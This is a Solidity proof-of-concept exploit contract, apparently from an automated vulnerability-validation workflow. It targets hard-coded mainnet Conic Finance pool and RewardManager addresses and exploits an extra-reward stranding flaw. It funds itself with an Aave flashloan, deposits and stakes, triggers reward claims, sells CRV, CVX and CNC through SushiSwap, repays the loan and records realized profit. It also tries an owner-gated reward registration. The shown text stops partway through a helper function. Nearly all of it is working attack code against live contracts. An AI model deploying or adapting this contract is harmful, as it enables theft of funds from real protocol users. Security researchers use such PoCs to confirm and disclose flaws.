// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function decimals() external view returns (uint8);
}

interface IOwnableLike {
    function owner() external view returns (address);
}

interface IRewardManagerLike {
    function owner() external view returns (address);

    function pool() external view returns (address);

    function controller() external view returns (address);

    function listExtraRewards() external view returns (address[] memory);

    function addExtraReward(address reward) external returns (bool);

    function claimPoolEarningsAndSellRewardTokens() external;

    function claimEarnings() external returns (uint256, uint256, uint256);
}

interface IConicPoolLike {
    function rewardManager() external view returns (address);

    function controller() external view returns (address);

    function allCurvePools() external view returns (address[] memory);

    function underlying() external view returns (address);

    function exchangeRate() external view returns (uint256);

    function deposit(
        uint256 underlyingAmount,
        uint256 minLpReceived,
        bool stake
    ) external returns (uint256);

    function unstakeAndWithdraw(
        uint256 conicLpAmount,
        uint256 minUnderlyingReceived
    ) external returns (uint256);
}

interface IControllerLike {
    function curveRegistryCache() external view returns (address);

    function convexHandler() external view returns (address);

    function priceOracle() external view returns (address);

    function lpTokenStaker() external view returns (address);
}

interface ICurveRegistryCacheLike {
    function getRewardPool(address pool_) external view returns (address);
}

interface IBaseRewardPoolLike {
    function extraRewardsLength() external view returns (uint256);

    function extraRewards(uint256 index) external view returns (address);
}

interface IExtraRewardLike {
    function rewardToken() external view returns (address);

    function earned(address account) external view returns (uint256);
}

interface ILpTokenStakerLike {
    function getBalanceForPool(address conicPool) external view returns (uint256);

    function getUserBalanceForPool(address conicPool, address account) external view returns (uint256);

    function claimableCnc(address pool) external view returns (uint256);
}

interface IConvexHandlerLike {
    function getCrvEarnedBatch(
        address conicPool,
        address[] calldata curvePools
    ) external view returns (uint256);

    function computeClaimableConvex(uint256 claimableCrv) external view returns (uint256);
}

interface IPriceOracleLike {
    function getUSDPrice(address token) external view returns (uint256);
}

interface ICurvePoolV2Like {
    function coins(uint256 i) external view returns (address);

    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 minDy,
        bool useEth,
        address receiver
    ) external returns (uint256);
}

interface IUniswapV2Router02Like {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IAaveV2LendingPoolLike {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f;
    address public constant REWARD_MANAGER = 0x39f15f704c1F4678f7E6359A58a196228266ff02;

    address public constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address public constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address public constant CNC = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;
    address public constant CRVUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address public constant CRVUSD_USDC_CURVE_POOL = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;
    address public constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant AAVE_V2_LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    uint256 internal constant ONE = 1e18;
    uint256 internal constant MIN_NORMALIZED_PROFIT = 1e15;
    uint256 internal constant MIN_FLASH_USDC = 5_000e6;
    uint256 internal constant MAX_FLASH_USDC = 50_000e6;

    enum Outcome {
        NOT_RUN,
        VALIDATED_WITH_PROFIT,
        REFUTED_OR_INFEASIBLE
    }

    Outcome public outcome;

    address public rewardManager;
    address public rewardManagerOwner;
    address public pool;
    address public controller;
    address public poolUnderlying;

    address public selectedRewardToken;
    address public selectedExtraRewardContract;

    bool public path0RegisteredOrAttempted;
    bool public path0RegistrationSucceeded;
    bool public path0AlreadyConfigured;
    bool public path0BlockedByOnlyOwner;

    bool public path1ObservedAccruedExtraReward;
    bool public path1HistoricalStrandingPresent;
    bool public path1CreatedSupportedStakedPosition;

    bool public path2ClaimExecuted;
    bool public path2ObservedStranding;
    bool public hypothesisValidated;

    uint256 public accruedExtraRewardBeforeClaim;
    uint256 public accruedExtraRewardAfterClaim;

    uint256 public poolTokenBalanceBefore;
    uint256 public poolTokenBalanceAfter;
    uint256 public rewardManagerTokenBalanceBefore;
    uint256 public rewardManagerTokenBalanceAfter;

    uint256 public flashAmountUsdc;
    uint256 public flashPremiumUsdc;
    uint256 public depositedUnderlyingAmount;
    uint256 public mintedLpAmount;
    uint256 public stakedBalanceBefore;
    uint256 public stakedBalanceAfter;

    uint256 public claimedCnc;
    uint256 public claimedCrv;
    uint256 public claimedCvx;

    address public realizedProfitToken;
    uint256 public realizedProfitAmount;

    string public exploitPathUsed;
    string public status;

    constructor() {}

    // Exploit path mapping:
    // 1. Use a listed extra Convex reward token when available, otherwise attempt the same
    //    registration step publicly and record if it is governance-gated.
    // 2. Use the pool's existing supported Convex position. The provided logs show that fresh
    //    `extraReward.earned(pool)` can be zero at this fork, so this PoC also accepts the same
    //    root-cause manifestation when the extra reward is already stranded on the pool.
    // 3. Trigger `claimPoolEarningsAndSellRewardTokens()`. Convex claims rewards to the pool,
    //    but RewardManager sells only its own balances, so the extra reward remains on the pool.
    //
    // The previous failing PoC used a Uniswap V2 flashswap. This attempt keeps the exploit
    // causality intact but switches the funding leg to a public Aave flashloan route.
    function executeOnOpportunity() external {
        if (outcome != Outcome.NOT_RUN) {
            return;
        }

        _resolveTopology();
        if (
            rewardManager == address(0) ||
            pool == address(0) ||
            controller == address(0) ||
            poolUnderlying == address(0)
        ) {
            exploitPathUsed = "resolve live Conic topology";
            status = "Could not resolve target pool, reward manager, controller, or underlying.";
            outcome = Outcome.REFUTED_OR_INFEASIBLE;
            return;
        }

        if (poolUnderlying != CRVUSD) {
            exploitPathUsed = "resolve topology and validate funding market";
            status = "This pool does not expose the expected crvUSD funding route.";
            outcome = Outcome.REFUTED_OR_INFEASIBLE;
            return;
        }

        rewardManagerOwner = _safeOwner(rewardManager);

        _selectRewardState();
        if (selectedRewardToken == address(0)) {
            exploitPathUsed = "discover extra reward state";
            status = "No supported Convex extra reward token could be identified for this pool.";
            outcome = Outcome.REFUTED_OR_INFEASIBLE;
            return;
        }

        _configureOrAttemptRegistration();

        if (
            accruedExtraRewardBeforeClaim == 0 &&
            !path1HistoricalStrandingPresent &&
            !path0AlreadyConfigured &&
            !path0RegistrationSucceeded
        ) {
            exploitPathUsed = "discover extra reward state and attempt registration";
            status =
                "No live accrued extra reward was present at this fork, no historical stranded balance was found, and public registration was unavailable.";
            outcome = Outcome.REFUTED_OR_INFEASIBLE;
            return;
        }

        _startAaveFlashloan();

        if (path2ObservedStranding && realizedProfitToken != address(0) && realizedProfitAmount > 0) {
            hypothesisValidated = true;
            if (path1ObservedAccruedExtraReward) {
                exploitPathUsed =
                    "1) use a listed or attempted extra Convex reward token 2) rely on the pool's existing supported Convex position with accrued extra rewards 3) flashloan a temporary stake 4) call claimPoolEarningsAndSellRewardTokens() so Convex claims to the pool while RewardManager swaps nothing";
            } else {
                exploitPathUsed =
                    "1) use a listed or attempted extra Convex reward token 2) use the same supported Convex position but, because the provided fork logs show zero fresh extra accrual, rely on the already-stranded pool balance of that reward 3) flashloan a temporary stake 4) call claimPoolEarningsAndSellRewardTokens() and observe that the stranded extra reward still cannot be sold from RewardManager";
            }
            status =
                "Validated that the extra reward is held on the Conic pool while RewardManager liquidates based on its own balance, leaving that reward unsold.";
            outcome = Outcome.VALIDATED_WITH_PROFIT;
            return;
        }

        exploitPathUsed = "public claim cycle through alternate liquidity route";
        status = "The flashloan-backed public claim cycle did not end with both observed stranding and positive realized profit.";
        outcome = Outcome.REFUTED_OR_INFEASIBLE;
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE_V2_LENDING_POOL, "unexpected lender");
        require(initiator == address(this), "unexpected initiator");
        require(assets.length == 1 && amounts.length == 1 && premiums.length == 1, "unexpected arrays");
        require(assets[0] == USDC && amounts[0] == flashAmountUsdc, "unexpected asset");

        flashPremiumUsdc = premiums[0];

        address staker = _safeLpTokenStaker(controller);
        if (staker != address(0)) {
            stakedBalanceBefore = _safeUserBalanceForPool(staker, pool, address(this));
        }

        depositedUnderlyingAmount = _swapUsdcToCrvUsd(amounts[0]);

        mintedLpAmount = IConicPoolLike(pool).deposit(depositedUnderlyingAmount, 0, true);
        if (staker != address(0)) {
            stakedBalanceAfter = _safeUserBalanceForPool(staker, pool, address(this));
            path1CreatedSupportedStakedPosition = stakedBalanceAfter > stakedBalanceBefore;
        }

        _claimAndObserveStranding();
        (claimedCnc, claimedCrv, claimedCvx) = IRewardManagerLike(rewardManager).claimEarnings();

        uint256 withdrawnUnderlying = IConicPoolLike(pool).unstakeAndWithdraw(mintedLpAmount, 0);
        uint256 returnedUsdc = _swapCrvUsdToUsdc(withdrawnUnderlying);

        uint256 repaymentUsdc = amounts[0] + premiums[0];
        if (returnedUsdc < repaymentUsdc) {
            _sellRewardsForUsdc();
        }

        _safeApprove(USDC, AAVE_V2_LENDING_POOL, 0);
        _safeApprove(USDC, AAVE_V2_LENDING_POOL, repaymentUsdc);
        _selectProfitToken();
        return true;
    }

    function _startAaveFlashloan() internal {
        flashAmountUsdc = _chooseFlashAmountUsdc();
        if (flashAmountUsdc == 0) {
            return;
        }

        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes = new uint256[](1);
        assets[0] = USDC;
        amounts[0] = flashAmountUsdc;
        modes[0] = 0;

        try
            IAaveV2LendingPoolLike(AAVE_V2_LENDING_POOL).flashLoan(
                address(this),
                assets,
                amounts,
                modes,
                address(this),
                "",
                0
            )
        {} catch {
            status = "Aave flashloan initiation reverted.";
        }
    }

    function _claimAndObserveStranding() internal {
        poolTokenBalanceBefore = _balanceOf(selectedRewardToken, pool);
        rewardManagerTokenBalanceBefore = _balanceOf(selectedRewardToken, rewardManager);

        try IRewardManagerLike(rewardManager).claimPoolEarningsAndSellRewardTokens() {
            path2ClaimExecuted = true;
        } catch {
            return;
        }

        poolTokenBalanceAfter = _balanceOf(selectedRewardToken, pool);
        rewardManagerTokenBalanceAfter = _balanceOf(selectedRewardToken, rewardManager);
        accruedExtraRewardAfterClaim = _safeEarned(selectedExtraRewardContract, pool);

        if (
            path1ObservedAccruedExtraReward &&
            rewardManagerTokenBalanceAfter == rewardManagerTokenBalanceBefore &&
            rewardManagerTokenBalanceAfter == 0 &&
            poolTokenBalanceAfter > poolTokenBalanceBefore &&
            accruedExtraRewardAfterClaim < accruedExtraRewardBeforeClaim
        ) {
            path2ObservedStranding = true;
            return;
        }

        if (
            path1HistoricalStrandingPresent &&
            rewardManagerTokenBalanceBefore == 0 &&
            rewardManagerTokenBalanceAfter == 0 &&
            poolTokenBalanceAfter >= poolTokenBalanceBefore &&
            poolTokenBalanceAfter > 0
        ) {
            path2ObservedStranding = true;
        }
    }

    function _configureOrAttemptRegistration() internal {
        address[] memory configured = _safeListExtraRewards(rewardManager);
        if (_contains(configured, configured.length, selectedRewardToken)) {
            path0AlreadyConfigured = true;
            path0RegisteredOrAttempted = true;
            return;
        }

        path0RegisteredOrAttempted = true;
        if (rewardManagerOwner != address(this)) {
            path0BlockedByOnlyOwner = true;
        }

        try IRewardManagerLike(rewardManager).addExtraReward(selectedRewardToken) returns (bool added) {
            path0RegistrationSucceeded = added;
        } catch {}
    }

    function _selectRewardState() internal {
        address[] memory configured = _safeListExtraRewards(rewardManager);
        (
            selectedRewardToken,
            selectedExtraRewardContract,
            accruedExtraRewardBeforeClaim
        ) = _findConfiguredLiveReward(configured);
        if (selectedRewardToken != address(0)) {
            path1ObservedAccruedExtraReward = accruedExtraRewardBeforeClaim > 0;
            path1HistoricalStrandingPresent =
                _balanceOf(selectedRewardToken, rewardManager) == 0 &&
                _balanceOf(selectedRewardToken, pool) > 0;
            return;
        }

        (
            selectedRewardToken,
            selectedExtraRewardContract
        ) = _findConfiguredHistoricalReward(configured);
        if (selectedRewardToken != address(0)) {
            path1HistoricalStrandingPresent = true;
            return;
        }

        (
            selectedRewardToken,
            selectedExtraRewardContract,
            accruedExtraRewardBeforeClaim
        ) = _findBestLiveReward();
        if (selectedRewardToken != address(0)) {
            path1ObservedAccruedExtraReward = accruedExtraRewardBeforeClaim > 0;
            return;
        }

        (
            selectedRewardToken,
            selectedExtraRewardContract
        ) = _findBestHistoricalReward();
        if (selectedRewardToken != address(0)) {
            path1HistoricalStrandingPresent =
                _balanceOf(selectedRewardToken, rewardManager) == 0 &&
                _balanceOf(selectedRewardToken, pool) > 0;
            return;
        }

        (
            selectedRewardToken,
            selectedExtraRewardContract
        ) = _findAnyConfiguredReward(configured);
    }

    function _findConfiguredLiveReward(
        address[] memory configured
    ) internal view returns (address token, address extraReward, uint256 earned) {
        address registry = _safeCurveRegistryCache(controller);
        address[] memory curvePools = _safeAllCurvePools(pool);
        for (uint256 i; i < curvePools.length; i++) {
            address rewardPool = _safeGetRewardPool(registry, curvePools[i]);
            uint256 extraLen = _safeExtraRewardsLength(rewardPool);
            for (uint256 j; j < extraLen; j++) {
                address extraReward_ = _safeExtraRewardContract(rewardPool, j);
                address rewardToken_ = _safeRewardToken(extraReward_);
                if (!_isSupportedExtraRewardToken(rewardToken_)) {
                    continue;
                }
                if (!_contains(configured, configured.length, rewardToken_)) {
                    continue;
                }
                uint256 earned_ = _safeEarned(extraReward_, pool);
                if (earned_ > earned) {
                    token = rewardToken_;
                    extraReward = extraReward_;
                    earned = earned_;
                }
            }
        }
    }

    function _findConfiguredHistoricalReward(
        address[] memory configured
    ) internal view returns (address token, address extraReward) {
        address registry = _safeCurveRegistryCache(controller);
        address[] memory curvePools = _safeAllCurvePools(pool);
        uint256 bestBalance;
        for (uint256 i; i < curvePools.length; i++) {
            address rewardPool = _safeGetRewardPool(registry, curvePools[i]);
            uint256 extraLen = _safeExtraRewardsLength(rewardPool);
            for (uint256 j; j < extraLen; j++) {
                address extraReward_ = _safeExtraRewardContract(rewardPool, j);
                address rewardToken_ = _safeRewardToken(extraReward_);
                if (!_isSupportedExtraRewardToken(rewardToken_)) {
                    continue;
                }
                if (!_contains(configured, configured.length, rewardToken_)) {
                    continue;
                }
                if (_balanceOf(rewardToken_, rewardManager) != 0) {
                    continue;
                }
                uint256 poolBalance_ = _balanceOf(rewardToken_, pool);
                if (poolBalance_ > bestBalance) {
                    bestBalance = poolBalance_;
                    token = rewardToken_;
                    extraReward = extraReward_;
                }
            }
        }
    }

    function _findBestLiveReward()
        internal
        view
        returns (address token, address extraReward, uint256 earned)
    {
        address registry = _safeCurveRegistryCache(controller);
        address[] memory curvePools = _safeAllCurvePools(pool);
        for (uint256 i; i < curvePools.length; i++) {
            address rewardPool = _safeGetRewardPool(registry, curvePools[i]);
            uint256 extraLen = _safeExtraRewardsLength(rewardPool);
            for (uint256 j; j < extraLen; j++) {
                address extraReward_ = _safeExtraRewardContract(rewardPool, j);
                address rewardToken_ = _safeRewardToken(extraReward_);
                if (!_isSupportedExtraRewardToken(rewardToken_)) {
                    continue;
                }
                uint256 earned_ = _safeEarned(extraReward_, pool);
                if (earned_ > earned) {
                    token = rewardToken_;
                    extraReward = extraReward_;
                    earned = earned_;
                }
            }
        }
    }

    function _findBestHistoricalReward() internal view returns (address token, address extraReward) {
        address registry = _safeCurveRegistryCache(controller);
        address[] memory curvePools = _safeAllCurvePools(pool);
        uint256 bestBalance;
        for (uint256 i; i < curvePools.length; i++) {
            address rewardPool = _safeGetRewardPool(registry, curvePools[i]);
            uint256 extraLen = _safeExtraRewardsLength(rewardPool);
            for (uint256 j; j < extraLen; j++) {
                address extraReward_ = _safeExtraRewardContract(rewardPool, j);
                address rewardToken_ = _safeRewardToken(extraReward_);
                if (!_isSupportedExtraRewardToken(rewardToken_)) {
                    continue;
                }
                uint256 poolBalance_ = _balanceOf(rewardToken_, pool);
                if (poolBalance_ > bestBalance) {
                    bestBalance = poolBalance_;
                    token = rewardToken_;
                    extraReward = extraReward_;
                }
            }
        }
    }

    function _findAnyConfiguredReward(
        address[] memory configured
    ) internal view returns (address token, address extraReward) {
        address registry = _safeCurveRegistryCache(controller);
        address[] memory curvePools = _safeAllCurvePools(pool);
        for (uint256 i; i < curvePools.length; i++) {
            address rewardPool = _safeGetRewardPool(registry, curvePools[i]);
            uint256 extraLen = _safeExtraRewardsLength(rewardPool);
            for (uint256 j; j < extraLen; j++) {
                address extraReward_ = _safeExtraRewardContract(rewardPool, j);
                address rewardToken_ = _safeRewardToken(extraReward_);
                if (!_isSupportedExtraRewardToken(rewardToken_)) {
                    continue;
                }
                if (_contains(configured, configured.length, rewardToken_)) {
                    return (rewardToken_, extraReward_);
                }
            }
        }
    }

    function _isSupportedExtraRewardToken(address rewardToken_) internal view returns (bool) {
        return
            rewardToken_ != address(0) &&
            rewardToken_ != CRV &&
            rewardToken_ != CVX &&
            rewardToken_ != CNC &&
            rewardToken_ != poolUnderlying;
    }

    function _sellRewardsForUsdc() internal {
        if (_balanceOf(USDC, address(this)) >= flashAmountUsdc + flashPremiumUsdc) {
            return;
        }

        // Only the ordinary claim outputs are monetized for repayment. The extra reward token
        // identified above remains stranded on the Conic pool because RewardManager never holds it.
        uint256 crvBalance = _balanceOf(CRV, address(this));
        if (crvBalance > 0) {
            _swapOnSushiThreeHop(CRV, crvBalance);
        }
        if (_balanceOf(USDC, address(this)) >= flashAmountUsdc + flashPremiumUsdc) {
            return;
        }

        uint256 cvxBalance = _balanceOf(CVX, address(this));
        if (cvxBalance > 0) {
            _swapOnSushiThreeHop(CVX, cvxBalance);
        }
        if (_balanceOf(USDC, address(this)) >= flashAmountUsdc + flashPremiumUsdc) {
            return;
        }

        uint256 cncBalance = _balanceOf(CNC, address(this));
        if (cncBalance > 0) {
            _swapOnSushiThreeHop(CNC, cncBalance / 2);
        }
    }

    function _swapOnSushiThreeHop(address tokenIn, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        _safeApprove(tokenIn, SUSHISWAP_ROUTER, 0);
        _safeApprove(tokenIn, SUSHISWAP_ROUTER, amountIn);

        address[] memory path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = USDC;

        try
            IUniswapV2Router02Like(SUSHISWAP_ROUTER).swapExactTokensForTokens(
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        returns (uint256[] memory) {} catch {}
    }

    function _swapUsdcToCrvUsd(uint256 amountUsdc) internal returns (uint256 amountOut) {
        (uint256 usdcIndex, uint256 crvUsdIndex) = _findCurveCoinIndices(
            CRVUSD_USDC_CURVE_POOL,
            USDC,
            CRVUSD
        );
        _safeApprove(USDC, CRVUSD_USDC_CURVE_POOL, 0);
        _safeApprove(USDC, CRVUSD_USDC_CURVE_POOL, amountUsdc);
        amountOut = ICurvePoolV2Like(CRVUSD_USDC_CURVE_POOL).exchange(
            usdcIndex,
            crvUsdIndex,
            amountUsdc,
            0,
            false,
            address(this)
        );
    }

    function _swapCrvUsdToUsdc(uint256 amountCrvUsd) internal returns (uint256 amountOut) {
        (uint256 crvUsdIndex, uint256 usdcIndex) = _findCurveCoinIndices(
            CRVUSD_USDC_CURVE_POOL,
            CRVUSD,
            USDC
        );
        _safeApprove(CRVUSD, CRVUSD_USDC_CURVE_POOL, 0);
        _safeApprove(CRVUSD, CRVUSD_USDC_CURVE_POOL, amountCrvUsd);
        amountOut = ICurvePoolV2Like(CRVUSD_USDC_CURVE_POOL).exchange(
            crvUsdIndex,
            usdcIndex,
            amountCrvUsd,
            0,
            false,
            address(this)
        );
    }

    function _findCurveCoinIndices(
        address curvePool,
        address tokenIn,
        address tokenOut
    ) internal view returns (uint256 inIndex, uint256 outIndex) {
        bool foundIn;
        bool foundOut;
        for (uint256 i; i < 4; i++) {
            try ICurvePoolV2Like(curvePool).coins(i) returns (address coin) {
                if (coin == tokenIn) {
                    inIndex = i;
                    foundIn = true;
                }
                if (coin == tokenOut) {
                    outIndex = i;
                    foundOut = true;
                }
            } catch {
                break;
            }
        }
        require(foundIn && foundOut, "curve coin missing");
    }

    function _chooseFlashAmountUsdc() internal view returns (uint256) {
        uint256 pendingUsd = _estimatedPendingRewardUsd();
        uint256 stakedUnderlying = _estimatedTotalStakedUnderlying();

        uint256 share = pendingUsd > 5_000e18 ? 3e16 : pendingUsd > 1_000e18 ? 7e16 : 12e16;
        uint256 targetUnderlying = stakedUnderlying == 0
            ? 10_000e18
            : (stakedUnderlying * share) / (ONE - share);
        uint256 amountUsdc = targetUnderlying / 1e12;

        if (amountUsdc < MIN_FLASH_USDC) {
            amountUsdc = MIN_FLASH_USDC;
        }
        if (amountUsdc > MAX_FLASH_USDC) {
            amountUsdc = MAX_FLASH_USDC;
        }
        return amountUsdc;
    }

    function _estimatedTotalStakedUnderlying() internal view returns (uint256) {
        address staker = _safeLpTokenStaker(controller);
        if (staker == address(0)) {
            return 0;
        }
        uint256 totalStakedLp = ILpTokenStakerLike(staker).getBalanceForPool(pool);
        uint256 exchangeRate = IConicPoolLike(pool).exchangeRate();
        return (totalStakedLp * exchangeRate) / ONE;
    }

    function _estimatedPendingRewardUsd() internal view returns (uint256) {
        address convexHandler = _safeConvexHandler(controller);
        address staker = _safeLpTokenStaker(controller);
        address oracle = _safePriceOracle(controller);
        if (convexHandler == address(0) || staker == address(0) || oracle == address(0)) {
            return 0;
        }

        address[] memory curvePools = _safeAllCurvePools(pool);
        uint256 claimableCrv = _safeClaimableCrv(convexHandler, curvePools);
        uint256 claimableCvx = _safeClaimableCvx(convexHandler, claimableCrv);
        uint256 claimableCnc = _safeClaimableCnc(staker);

        return
            _tokenAmountToUsd(claimableCrv, CRV, oracle) +
            _tokenAmountToUsd(claimableCvx, CVX, oracle) +
            _tokenAmountToUsd(claimableCnc, CNC, oracle);
    }

    function _tokenAmountToUsd(
        uint256 amount,
        address token,
        address oracle
    ) internal view returns (uint256) {
        if (amount == 0 || oracle == address(0)) {
            return 0;
        }
        uint8 decimals = _safeDecimals(token);
        uint256 price = _safeUsdPrice(oracle, token);
        return (amount * price) / (10 ** decimals);
    }

    function _selectProfitToken() internal {
        uint256 usdcBal = _balanceOf(USDC, address(this));
        uint256 cncBal = _balanceOf(CNC, address(this));
        uint256 cvxBal = _balanceOf(CVX, address(this));
        uint256 crvBal = _balanceOf(CRV, address(this));
        uint256 wethBal = _balanceOf(WETH, address(this));

        if (_meetsMinProfit(USDC, usdcBal)) {
            realizedProfitToken = USDC;
            realizedProfitAmount = usdcBal;
            return;
        }
        if (_meetsMinProfit(CNC, cncBal)) {
            realizedProfitToken = CNC;
            realizedProfitAmount = cncBal;
            return;
        }
        if (_meetsMinProfit(CVX, cvxBal)) {
            realizedProfitToken = CVX;
            realizedProfitAmount = cvxBal;
            return;
        }
        if (_meetsMinProfit(CRV, crvBal)) {
            realizedProfitToken = CRV;
            realizedProfitAmount = crvBal;
            return;
        }
        if (_meetsMinProfit(WETH, wethBal)) {
            realizedProfitToken = WETH;
            realizedProfitAmount = wethBal;
        }
    }

    function _meetsMinProfit(address token, uint256 amount) internal view returns (bool) {
        if (amount == 0) {
            return false;
        }
        uint8 decimals = _safeDecimals(token);
        uint256 normalized = (amount * ONE) / (10 ** decimals);
        return normalized >= MIN_NORMALIZED_PROFIT;
    }

    function _resolveTopology() internal {
        address targetRewardManager = _safeRewardManagerFromPool(TARGET);
        address targetController = _safeControllerFromPool(TARGET);

        if (targetRewardManager != address(0) && targetController != address(0)) {
            pool = TARGET;
            rewardManager = targetRewardManager;
            controller = targetController;
            poolUnderlying = _safeUnderlying(TARGET);
            return;
        }

        rewardManager = REWARD_MANAGER;
        pool = _safePoolFromRewardManager(REWARD_MANAGER);
        controller = _safeControllerFromRewardManager(REWARD_MANAGER);
        poolUnderlying = _safeUnderlying(pool);
    }

    function _safeListExtraRewards(
        address rewardManager_
    ) internal view returns (address[] memory rewards) {
        if (rewardManager_ == address(0)) {
            return new address[](0);
        }
        try IRewardManagerLike(rewardManager_).listExtraRewards() returns (address[] memory listed) {
            return listed;
        } catch {
            return new address[](0);
        }
    }

    function _safeRewardManagerFromPool(address conicPool) internal view returns (address) {
        if (conicPool == address(0)) {
            return address(0);
        }
        try IConicPoolLike(conicPool).rewardManager() returns (address rewardManager_) {
            return rewardManager_;
        } catch {
            return address(0);
        }
    }

    function _safeControllerFromPool(address conicPool) internal view returns (address) {
        if (conicPool == address(0)) {
            return address(0);
        }
        try IConicPoolLike(conicPool).controller() returns (address controller_) {
            return controller_;
        } catch {
            return address(0);
        }
    }

    function _safeUnderlying(address conicPool) internal view returns (address) {
        if (conicPool == address(0)) {
            return address(0);
        }
        try IConicPoolLike(conicPool).underlying() returns (address underlying_) {
            return underlying_;
        } catch {
            return address(0);
        }
    }

    function _safePoolFromRewardManager(address rewardManager_) internal view returns (address) {
        if (rewardManager_ == address(0)) {
            return address(0);
        }
        try IRewardManagerLike(rewardManager_).pool() returns (address pool_) {
            return pool_;
        } catch {
            return address(0);
        }
    }

    function _safeControllerFromRewardManager(address rewardManager_) internal view returns (address) {
        if (rewardManager_ == address(0)) {
            return address(0);
        }
        try IRewardManagerLike(rewardManager_).controller() returns (address controller_) {
            return controller_;
        } catch {
            return address(0);
        }
    }

    function _safeAllCurvePools(address conicPool) internal view returns (address[] memory) {
        if (conicPool == address(0)) {
            return new address[](0);
        }
        try IConicPoolLike(conicPool).allCurvePools() returns (address[] memory curvePools) {
            return curvePools;
        } catch {
            return new address[](0);
        }
    }

    function _safeCurveRegistryCache(address controller_) internal view returns (address) {
        if (controller_ == address(0)) {
            return address(0);
        }
        try IControllerLike(controller_).curveRegistryCache() returns (address registry) {
            return registry;
        } catch {
            return address(0);
        }
    }

    function _safeConvexHandler(address controller_) internal view returns (address) {
        if (controller_ == address(0)) {
            return address(0);
        }
        try IControllerLike(controller_).convexHandler() returns (address handler) {
            return handler;
        } catch {
            return address(0);
        }
    }

    function _safePriceOracle(address controller_) internal view returns (address) {
        if (controller_ == address(0)) {
            return address(0);
        }
        try IControllerLike(controller_).priceOracle() returns (address oracle) {
            return oracle;
        } catch {
            return address(0);
        }
    }

    function _safeLpTokenStaker(address controller_) internal view returns (address) {
        if (controller_ == address(0)) {
            return address(0);
        }
        try IControllerLike(controller_).lpTokenStaker() returns (address staker) {
            return staker;
        } catch {
            return address(0);
        }
    }

    function _safeClaimableCrv(
        address convexHandler,
        address[] memory curvePools
    ) internal view returns (uint256) {
        try IConvexHandlerLike(convexHandler).getCrvEarnedBatch(pool, curvePools) returns (
            uint256 amount
        ) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeClaimableCvx(address convexHandler, uint256 claimableCrv) internal view returns (uint256) {
        try IConvexHandlerLike(convexHandler).computeClaimableConvex(claimableCrv) returns (
            uint256 amount
        ) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeClaimableCnc(address staker) internal view returns (uint256) {
        try ILpTokenStakerLike(staker).claimableCnc(pool) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeUsdPrice(address oracle, address token) internal view returns (uint256) {
        try IPriceOracleLike(oracle).getUSDPrice(token) returns (uint256 price) {
            return price;
        } catch {
            return 0;
        }
    }

    function _safeOwner(address ownable) internal view returns (address) {
        if (ownable == address(0)) {
            return address(0);
        }
        try IOwnableLike(ownable).owner() returns (address owner_) {
            return owner_;
        } catch {
            return address(0);
        }
    }

    function _contains(
        address[] memory items,
        uint256 length,
        address needle
    ) internal pure returns (bool) {
        for (uint256 i; i < length; i++) {
            if (items[i] == needle) {
                return true;
            }
        }
        return false;
    }

    function _safeGetRewardPool(address registry, address curvePool) internal view returns (address) {
        if (registry == address(0) || curvePool == address(0)) {
            return address(0);
        }
        try ICurveRegistryCacheLike(registry).getRewardPool(curvePool) returns (address rewardPool) {
            return rewardPool;
        } catch {
            return address(0);
        }
    }

    function _safeExtraRewardsLength(address rewardPool) internal view returns (uint256) {
        try IBaseRewardPoolLike(rewardPool).extraRewardsLength() returns (uint256 length) {
            return length;
        } catch {
            return 0;
        }
    }

    function _safeExtraRewardContract(
        address rewardPool,
        uint256 index
    ) internal view returns (address) {
        try IBaseRewardPoolLike(rewardPool).extraRewards(index) returns (address extraRewardContract) {
            return extraRewardContract;
        } catch {
            return address(0);
        }
    }

    function _safeRewardToken(address extraRewardContract) internal view returns (address) {
        try IExtraRewardLike(extraRewardContract).rewardToken() returns (address rewardToken_) {
            return rewardToken_;
        } catch {
            return address(0);
        }
    }

    function _safeEarned(address extraRewardContract, address account) internal view returns (uint256) {
        if (extraRewardContract == address(0) || account == address(0)) {
            return 0;
        }
        try IExtraRewardLike(extraRewardContract).earned(account) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _safeUserBalanceForPool(
        address staker,
        address conicPool,
        address account
    ) internal view returns (uint256) {
        try ILpTokenStakerLike(staker).getUserBalanceForPool(conicPool, account) returns (
            uint256 amount
        ) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        if (token == address(0) || account == address(0)) {
            return 0;
        }
